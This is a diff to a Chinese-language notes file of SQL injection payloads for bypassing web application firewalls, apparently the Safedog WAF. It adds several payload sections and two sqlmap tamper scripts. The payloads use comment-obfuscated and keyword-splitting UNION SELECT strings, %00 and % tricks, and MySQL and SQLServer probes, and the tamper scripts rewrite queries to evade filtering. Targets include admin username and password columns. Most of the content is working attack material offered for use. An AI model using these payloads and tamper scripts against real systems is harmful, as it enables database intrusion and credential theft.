@@ -1,3 +1,4 @@
+Payload-1：
 一： and 1=1 和 and 1=2  绕过
 字符型+Mysql： 
 
@@ -70,18 +71,14 @@ s%20where%20table_schema=0x7365637572697479%20%26%26%20table_name=0x7573657273%2
 过滤了 sleep() 函数，使用 benchmark() 函数
 
 
-
- 
 奇怪的Payload
 字符型+Mysql
 爆数据库名：
 '-ghtwf01()--+
  
- 
-
 
  
- 
+Payload-2：
  安全狗-4.0
  字符型+Mysql
  一： and 1=1 
@@ -145,7 +142,7 @@ s%20where%20table_schema=0x7365637572697479%20%26%26%20table_name=0x7573657273%2
 /*!updatexml/*!/*/**/*/ 
 /*!extractvalue/*!/*/**/*/
 
-tamper:
+tamper-1
 #!/usr/bin/env python
 # -*- coding: UTF-8 -*-
 from lib.core.enums import PRIORITY
@@ -165,17 +162,76 @@ def tamper(payload, **kwargs):
       payload=payload.replace("OR","/*!OR/*!/*/**/*/")
       payload=payload.replace("UNION","/*!UNION/*!/*/**/*/")
       payload=payload.replace("SELECT","/*!SELECT/*!/*/**/*/")
-21    payload=payload.replace("USER()","/*!USER/*!/*/**/*/()/**/")
-22    payload=payload.replace("DATABASE()","/*!DATABASE/*!/*/**/*/()/**/")
-23    l payload=payload.replace("VERSION()","/*!VERSION/*!/*/**/*/()/**/")
-24 payload=payload.replace("SESSION_USER()","/*!SESSION_USER/*!/*/**/*/()/**/")
-25 payload=payload.replace("EXTRACTVALUE","/*!EXTRACTVALUE/*!/*/**/*/()/**/")
-26 payload=payload.replace("UPDATEXML","/*!UPDATEXML/*!/*/**/*/")
-27
-28 return payload
+      payload=payload.replace("USER()","/*!USER/*!/*/**/*/()/**/")
+      payload=payload.replace("DATABASE()","/*!DATABASE/*!/*/**/*/()/**/")
+      payload=payload.replace("VERSION()","/*!VERSION/*!/*/**/*/()/**/")
+      payload=payload.replace("SESSION_USER()","/*!SESSION_USER/*!/*/**/*/()/**/")
+      payload=payload.replace("EXTRACTVALUE","/*!EXTRACTVALUE/*!/*/**/*/()/**/")
+      payload=payload.replace("UPDATEXML","/*!UPDATEXML/*!/*/**/*/")
+
+ return payload
  
  
+ tamper -2 
+# coding=UTF-8 
+# Desc: sqlmap_bypass_安全狗_tamper 
+from lib.core.enums import PRIORITY
+from lib.core.settings import UNICODE_ENCODING
+__priority__ = PRIORITY.LOW
+def dependencies():
+pass
+def tamper(payload, **kwargs):
+
+if payload:
+payload=payload.replace(" ","/*!*/")
+payload=payload.replace("=","/*!*/=/*!*/")
+payload=payload.replace("AND","/*!*/AND/*!*/")
+payload=payload.replace("UNION","union/*!88888cas*/")
+payload=payload.replace("#","/*!*/#")
+payload=payload.replace("USER()","USER/*!()*/")
+payload=payload.replace("DATABASE()","DATABASE/*!()*/")
+payload=payload.replace("--","/*!*/--")
+payload=payload.replace("SELECT","/*!88888cas*/select")
+payload=payload.replace("FROM","/*!99999c*//*!99999c*/from")
+print payload
+
+return payload
  
  
+Payload-3
+数字型+Mysql： 
+
+一.union select绕过
+1. SE/**/ LECT
+2.union S%E%L%E%C%T 1,2,3,4,5 F%R%O%M admin　
+3.id=(-1) UNION (SEL%E%CT 1,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from (admin))  
+4.UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g JOIN (SELECT 8)h JOIN (SELECT 9)i JOIN (SELECT 10)j JOIN (SELECT 11)k JOIN (SELECT 12)l JOIN (SELECT 13)m JOIN (SELECT 14)n JOIN (SELECT 15)o JOIN (SELECT 16)p JOIN (SELECT 17)q JOIN (SELECT 18)r JOIN (SELECT 19)s)#
+
+二. %00绕过
+http://url/xxx.asp?id=1
+变换成 http://url/xxx.asp?xxx.com=%00.&id=1 -->sqlmap
+
+
+
+Payload-4
+方法一：
+%00绕过
+xxx.asp?xxx=%00&id=sql 
+xxx.asp?xxx=%00.&id=sql
+
+方法二：
+%绕过
+在被过滤的关键词中添加 %
+
+方法二：
+%a绕过
+id=1 un%aion sel%aect 1,2,3,4 fr%aom admin 
+
+
+Payload-5
+SQLServer + 数字型
+a%nd exists (select * f%rom Manage_User)
+
+
 
 
